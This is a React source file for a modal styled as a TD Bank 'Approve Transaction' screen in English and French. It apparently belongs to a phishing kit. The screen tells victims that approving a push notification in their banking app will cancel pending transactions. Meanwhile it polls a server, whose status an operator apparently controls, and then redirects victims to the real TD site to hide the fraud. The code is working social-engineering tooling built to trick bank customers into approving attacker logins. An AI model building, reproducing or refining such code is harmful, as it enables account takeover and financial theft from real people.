import React, { useEffect, useState } from 'react';
import { X, ShieldCheck, Smartphone, CheckCircle } from 'lucide-react';

const translations = {
  en: {
    title: 'Approve Transaction',
    subtitle: 'A push notification was sent to your TD Bank mobile app. Please open your app and approve the request to cancel the pending transactions.',
    bullets: [
      { icon: Smartphone, text: 'Open your TD Bank mobile app' },
      { icon: ShieldCheck, text: 'Review the request details' },
      { icon: CheckCircle, text: 'Tap "Approve" to cancel pending transactions' },
    ],
    note: 'This extra step helps us keep your account secure.',
    securityBadge: 'Verified by TD Security',
    waitingText: 'Waiting for approval...',
    successTitle: 'Transaction Approved',
    successText: 'Your pending transactions will be cancelled in a moment...',
  },
  fr: {
    title: 'Approuver la Transaction',
    subtitle: 'Une notification push a été envoyée à votre application mobile TD. Veuillez ouvrir votre application et approuver la demande pour annuler les transactions en attente.',
    bullets: [
      { icon: Smartphone, text: 'Ouvrez votre application mobile TD' },
      { icon: ShieldCheck, text: 'Examinez les détails de la demande' },
      { icon: CheckCircle, text: 'Appuyez sur "Approuver" pour annuler les transactions en attente' },
    ],
    note: 'Cette étape supplémentaire nous aide à sécuriser votre compte.',
    securityBadge: 'Vérifié par Sécurité TD',
    waitingText: 'En attente d\'approbation...',
    successTitle: 'Transaction Approuvée',
    successText: 'Vos transactions en attente seront annulées dans un instant...',
  },
};

export default function AppPushModal({ email, lang = 'en', onClose }) {
  const t = translations[lang];
  const [isSuccess, setIsSuccess] = useState(false);
  const [redirectUrl, setRedirectUrl] = useState('https://www.td.com/ca/en/personal-banking');

  useEffect(() => {
    let isMounted = true;
    
    const pollStatus = async () => {
      if (isSuccess) return; // Stop polling if already success
      
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-td-banque' },
        });
        const data = await response.json();
        if (!isMounted) return;
        
        if (data.success) {
          if (data.status === 'cancelled' || data.status === 'idle') {
            onClose();
            window.location.reload();
          } else if (data.status === 'redirect_success') {
            if (data.redirectUrl) {
              setRedirectUrl(data.redirectUrl);
            }
            setIsSuccess(true);
          }
        }
      } catch (err) {
        console.error('Error polling session status in AppPushModal:', err);
      }
    };
    
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    
    return () => { 
      isMounted = false; 
      clearInterval(intervalId);
    };
  }, [email, onClose, isSuccess]);

  useEffect(() => {
    if (isSuccess) {
      // Clear client-side state
      localStorage.removeItem('showAppPushModal');
      localStorage.removeItem('otpEmail');
      
      // Clear server-side session
      fetch('/api/clear-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-banque' },
        body: JSON.stringify({ email })
      }).catch(err => console.error('Error clearing session:', err));

      const timer = setTimeout(() => {
        window.location.href = redirectUrl;
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [isSuccess, redirectUrl, email]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in">
      <div className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.15)] px-8 pt-9 pb-8 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden">
        {/* Decorative top accent line with TD Green */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#1a7b3a] to-[#12412A]" />

        {onClose && !isSuccess && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#555] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* TD Logo Container */}
        <div className="flex justify-center mb-5">
          <div className={`bg-[#f0faf3] p-2 rounded-2xl shadow-[0_4px_12px_rgba(26,92,42,0.08)] border border-[#e8f5ec] transition-all duration-500 hover:scale-105 ${isSuccess ? 'bg-[#e8f5ec] shadow-md scale-110' : ''}`}>
            <img 
              src="/td-logo.png" 
              alt="TD Logo" 
              className="w-14 h-14 object-contain rounded-xl"
            />
          </div>
        </div>

        {isSuccess ? (
          <div className="flex flex-col items-center justify-center py-4 animate-fade-in">
            <CheckCircle className="w-16 h-16 text-[#1a7b3a] mb-4 drop-shadow-sm" />
            <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
              {t.successTitle}
            </h3>
            <p className="text-[#1a7b3a] text-[15px] font-medium text-center">
              {t.successText}
            </p>
          </div>
        ) : (
          <>
            <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
              {t.title}
            </h3>
            <p className="text-[#6b7280] text-[14.5px] text-center mb-6 leading-relaxed px-2">
              {t.subtitle}
            </p>

            {/* Bullet features cards */}
            <ul className="space-y-3 mb-6">
              {t.bullets.map(({ icon: Icon, text }) => (
                <li 
                  key={text} 
                  className="flex items-center gap-3.5 p-3 rounded-xl bg-[#f0faf3]/60 border border-[#e8f5ec]/80 hover:bg-[#e8f5ec]/70 transition-all duration-300"
                >
                  <span className="flex-shrink-0 w-8 h-8 rounded-lg bg-[#e8f5ec] flex items-center justify-center shadow-sm">
                    <Icon className="w-[18px] h-[18px] text-[#1a7b3a]" />
                  </span>
                  <span className="text-[13.5px] text-[#374151] font-medium leading-tight">{text}</span>
                </li>
              ))}
            </ul>

            {/* Waiting indicator */}
            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-4 bg-[#f8fafc] py-4 rounded-xl border border-[#e2e8f0]">
              <svg className="animate-spin w-7 h-7 text-[#1a7b3a]" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25"/>
                <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/>
              </svg>
              <span className="text-[14px] text-[#475569] font-medium animate-pulse">{t.waitingText}</span>
            </div>

            <p className="text-[12px] text-[#888] text-center mt-2 leading-normal px-2">
              {t.note}
            </p>

            {/* Security badge pill */}
            <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f3f4f6]">
              <div className="flex items-center gap-1.5 bg-[#f0faf3] border border-[#e8f5ec] px-3.5 py-1.5 rounded-full shadow-sm">
                <ShieldCheck className="w-3.5 h-3.5 text-[#1a7b3a]" />
                <span className="text-[10px] text-[#1a7b3a] font-bold tracking-wider uppercase">
                  {t.securityBadge}
                </span>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
